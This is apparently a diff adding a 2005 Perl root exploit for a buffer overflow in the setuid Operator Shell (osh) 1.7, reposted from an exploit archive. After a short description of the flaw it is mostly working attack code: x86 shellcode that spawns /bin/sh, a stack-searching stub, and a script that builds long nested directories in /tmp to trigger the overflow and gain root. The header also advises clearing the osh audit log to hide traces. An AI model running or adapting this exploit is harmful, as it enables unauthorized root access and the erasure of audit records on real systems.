@@ -1,0 +1,147 @@
+# You must be group(operator) for permissions /str0ke
+
+#!/usr/bin/perl 
+#######################################################################
+#
+# OSH 1.7 Exploit #2 (Gonna bang away at this until it's removed ;-)
+#
+# EDUCATIONAL purposes only.... :-)
+#
+# by Charles Stevenson (core) <core@bokeoa.com>
+#
+# Description:
+# The Operator Shell (Osh) is a setuid root, security enhanced, restricted
+# shell. It allows the administrator to carefully limit the access of special
+# commands and files to the users whose duties require their use, while
+# at the same time automatically maintaining audit records. The configuration
+# file for Osh contains an administrator defined access profile for each
+# authorized user or group.
+#
+# Problem (discovered by Solar Eclipse):
+#
+# handlers.c:364
+#
+#    char temp3[255];
+#
+#    if (*file!='/') {
+#      getcwd(temp3, MAXPATHLEN);
+#      strcat(temp3,"/");
+#      strcat(temp3,file);
+#    }
+#
+#    ...
+#
+#    "If the length of the current working directory plus the length of the
+#    file name is longer than 255 bytes, there will be a buffer overflow in
+#    temp3[]. The size limit of the current direcory is MAXPATHLEN, which is
+#    defined as 1024 on modern Linux systems. The limit for the file name is
+#    MAXFNAME, defined as 32 in struct.h:116."
+#
+#    "This code is in the writable() function, which is called by the handlers
+#    for built-in cp, vi, rm and test commands, as well as the redirect
+#    function." -- Solar Eclipse
+#
+# Risk: Medium since user would have to be in the operator group which
+#       the admin would have to grant explicitly and I assume would be
+#       a trustworthy individual ;-)
+#
+# Solution:
+# apt-get --purge remove osh
+#
+# greetz to solar eclipse, nemo, andrewg, cnn, arcanum, mercy, amnesia, 
+# banned-it, capsyl, sloth, redsand, KF, akt0r, MRX, salvia, truthix, ...
+#
+# irc.pulltheplug.org (#social)
+# 0dd: much <3 & respect
+# 
+# 08/12/05 - PoC causes segv with 0x41414141 eip
+# 08/16/05 - PoC _exit(0) ... need shellcode to get past char filters
+# 08/16/04 - Later that night... or morning... ROOTSHELL!! Woot! PTP joint
+#            effort on the shellcode.
+#
+# I still find it hard to imagine that anyone would use osh
+# The code is basically beyond repair. Sudo is better.... :-)
+#
+# Don't forget to clean /var/log/osh.log
+#
+#######################################################################
+#               PRIVATE - DO NOT DISTRIBUTE - PRIVATE                 #
+#######################################################################
+
+
+# Yanked from one of KF's exploits.. werd brotha ;-) I'm lazy..
+$sc = "\x90" x (511-45) .
+
+# 45 bytes by anthema. 0xff less 
+"\x89\xe6" . # /* movl %esp, %esi */ 
+"\x83\xc6\x30" . # /* addl $0x30, %esi */ 
+"\xb8\x2e\x62\x69\x6e" . # /bin /* movl $0x6e69622e, %eax */ 
+"\x40" . # /* incl %eax */ 
+"\x89\x06" . # /* movl %eax, (%esi) */ 
+"\xb8\x2e\x73\x68\x21" . # /sh /* movl $0x2168732e, %eax */ 
+"\x40" . # /* incl %eax */ 
+"\x89\x46\x04" . # /* movl %eax, 0x04(%esi) */ 
+"\x29\xc0" . # /* subl %eax, %eax */ 
+"\x88\x46\x07" . # /* movb %al, 0x07(%esi) */ 
+"\x89\x76\x08" . # /* movl %esi, 0x08(%esi) */ 
+"\x89\x46\x0c" . # /* movl %eax, 0x0c(%esi) */ 
+"\xb0\x0b" . # /* movb $0x0b, %al */ 
+"\x87\xf3" . # /* xchgl %esi, %ebx */ 
+"\x8d\x4b\x08" . # /* leal 0x08(%ebx), %ecx */ 
+"\x8d\x53\x0c" . # /* leal 0x0c(%ebx), %edx */ 
+"\xcd\x80"; # /* int $0x80 */ 
+
+# 0day shellcodez....
+#
+# Nemo's idea... PTP #social collaborative effort.  Searches the stack
+# until it finds a nopsled and executes the shellcode
+$ptp_sc = 
+
+"\x61\x54\x59\x81\x39\x90\x90" .
+"\x90\x90\x74\x02\xeb\xf3\x54" .
+"\xc3";
+
+# _exit(0);
+#"\x31\xc0\x31\xdb\x40\xcd\x80";
+
+print "\nOperator Shell (osh) 1.7-13 root exploit\n";
+print "----------------------------------------------\n";
+print "Written by Charles Stevenson <core\@bokeoa.com>\n";
+print "This exploit would not have been near as fun without\n";
+print "the pulltheplug.org community.\n\n";
+
+# Clear out the environment. 
+foreach $key (keys %ENV) { delete $ENV{$key}; } 
+
+# Setup simple env
+$ENV{"HELLCODE"} = "$sc"; 
+$ENV{"TERM"} = "linux"; 
+$ENV{"PATH"} = "/usr/local/bin:/usr/bin:/bin"; 
+
+chdir("/tmp/");
+
+# Create the payload...
+mkdir("A"x255,0755);
+chdir("A"x255);
+mkdir("B"x255,0755);
+chdir("B"x255);
+mkdir("C"x118,0755);
+chdir("C"x118);
+
+#XXX: Return address can't have: 0x09 0x0a 0x20 0x22 0x24 0x26
+# (what made this fun)           0x3b 0x3c 0x3e 0x7c 0xff
+
+#$file = pack("l",0xdeadbeef) . "core";
+#$file = pack("l",0x804e36c) . "core";
+$file = pack("l",0x804e36c) . $ptp_sc; # inputfp + 12
+
+system("touch '$file'");
+system("/usr/sbin/osh test -w '$file'");
+
+print("cleaning up /tmp\n");
+chdir("../../../");
+system("rm -rf AAAA*/");
+
+# EOF
+
+# milw0rm.com [2005-08-16]
